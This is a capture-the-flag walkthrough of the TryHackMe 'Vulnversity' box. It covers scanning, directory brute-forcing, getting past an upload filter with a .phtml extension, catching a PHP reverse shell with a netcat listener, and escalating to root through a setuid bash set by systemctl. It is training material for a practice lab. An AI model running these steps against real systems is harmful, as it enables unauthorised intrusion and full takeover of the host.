# Vulnversity

```
export $MIP=<my-openvpn-ip>
export $IP=<tryhackme-box-ip>
```

## Reconnaissance
Run the following scan and outputting results to file
```
nmap -sV -sC -oN nlog.txt $IP
```
Questions:
1. ports? (6)
2. squid proxy version? (3.5.12)
3. operating system? (Linux; Unix; => Ubuntu)
4. web server port? (3333 => dec-notes)

Ports found:
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```

## GoBuster

Use gobuster to do discovery on the web service running on port 3333 to discover the directories exposed.

Example running gobuster with rockyou.txt
```
gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/rockyou.txt
```

Example running gobuster with dirbuster/directory-list-2.3-small.txt
```
gobuster dir -u http://$IP:333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Directory listings discovered
```
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
```

## Compromise the Web Server

Commonly blocked file types
```
.php, .java, .c, .py, .html, .js, etc.
```

-> Most web services should whitelist filetypes based on the purpose of the upload and secure any sensitive formats (executable .c, .java, .js, etc...) to prevent malicious code execution

The target box is blocking *.php* in this case. However php can be in several formats.

```
.php
.php3
.php4
.php5
.phtml
```

### Burp Suite

Specifically going to administer a Burp Suite + Intruder > Sniper Attack. 

1. Setup a proxy to capture traffic between Burp Suite and target
2. Capture upload request
3. Send request to Intruder tab
4. Add list of extensions to try as Payload (php ext above)
5. On Posiions tab correct the replacement character ($) around the file extension
6. Start attack
7. Examine each response to check for a proper message (other apps may 500 with bad request)

**.phtml worked for our example!!**

Note: *All requests came back 200 but only allowed the phtml extension of the list passed in.*

### Reverse Shell

Using [PenTestMonkeys Php ReverseShell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) for our purposes here.

Note: *change the ip and port to the desired capture destination*

1. Uploading to /internal page works successfully

-> followed up with go buster and found the following directories off of /internal

```
/uploads (Status: 301)
/css (Status: 301)
```

-> /uploads contains files uploaded by the /internal upload form

3. We need to open up a connection listener to await the reverse shell connection

netcat - can open a port on your ip to listen and capture a reverse shell.
```
nc -lvnp 9999
```

4. Navigate to https://$IP:3333/internal/uploads/reverse_shell.phtml to execute our script

5. The terminal where we started listening on should start terminal prompt as /bin/sh ($)

6. You should be able to 

```
id                  # see current role and privs
pwd                 # see where you are
whoami              # check which user you are in
cd /home && ls -la  # check which users exist
```

7. TryHackMe wants the flag in user directory -> cd /home/bill && cat user.txt

## Priviledge Escalation

SUID - In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

1. Found SUIDs with 'find / -perm /4000'
2. Did a dump of SUIDs set for Target box (in attack/suid.txt)
3. Did a dump of my SUIDs set (in attack/mysuid.txt)
4. GTFObins search of some /bin/* found systemctl as exploitable
5. Used JohnHammods approach from YouTube
6. Copied GTFObins to attack/escalate.sh
7. Checked /bin/bash currently is:

```
-rwxr-xr-x 1 root root 1183448 Jun 18 11:44 /bin/bash
```

7. After executeing GTFObins scripts it should show

```
-rwsr-sr-x 1 root root 1183448 Jun 18 11:44 /bin/bash
```

8. Theoreticall bash -p should now get me a effective root shell however I had to use python to run a script to spawn a bash shell and then run bash -p from there.

```
python -c 'import pty; pty.spawn("/bin/bash")'
bash -p
```

9. Then I acquired a root shell, and can cd to root to acquire the root.txt flag









